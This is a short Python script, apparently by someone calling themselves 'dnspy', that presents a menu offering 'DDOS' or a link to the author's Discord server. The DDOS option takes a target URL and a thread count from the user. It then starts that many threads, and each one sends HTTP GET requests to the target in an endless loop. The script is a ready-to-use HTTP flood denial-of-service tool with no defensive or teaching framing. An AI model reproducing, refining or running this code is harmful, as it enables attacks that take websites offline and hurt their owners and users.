import colorama 
import threading
import requests
import webbrowser


print('''
      
      
██████╗░███╗░░██╗░██████╗██████╗░██████╗░██████╗░░█████╗░░██████╗
██╔══██╗████╗░██║██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝
██║░░██║██╔██╗██║╚█████╗░██████╔╝██║░░██║██║░░██║██║░░██║╚█████╗░
██║░░██║██║╚████║░╚═══██╗██╔═══╝░██║░░██║██║░░██║██║░░██║░╚═══██╗
██████╔╝██║░╚███║██████╔╝██║░░░░░██████╔╝██████╔╝╚█████╔╝██████╔╝
╚═════╝░╚═╝░░╚══╝╚═════╝░╚═╝░░░░░╚═════╝░╚═════╝░░╚════╝░╚═════╝░
      
Coded by dnspy!
''')

message1 = '''

1.DDOS
2.My Discord Server

'''

operation = input(message1)

if operation == "1":
    def dos(target):
        while True:
            try:
                res = requests.get(target)
                print(colorama.Fore.GREEN + "Request sent!" + colorama.Fore.WHITE)
            except requests.exceptions.ConnectionError:
                print(colorama.Fore.WHITE + "[+] " + colorama.Fore.RED + "Connection error!")

    url = input("URL: ")

    try:
        threads = int(input("Threads: "))
    except ValueError:
        exit("Threads count is incorrect!")

    if threads == 0:
        exit("Threads count is incorrect!")

    if not url.startswith("http"):
        exit("URL doesn't contain http or https!")

    if not "." in url:
        exit("Invalid domain")

    for i in range(0, threads):
        thr = threading.Thread(target=dos, args=(url,))
        thr.start()
        print(str(i + 1) + " thread started!")

elif operation == "2":
    url = 'https://discord.gg/VzkbKbdZ'
    webbrowser.open(url)

input("Press enter to exit")
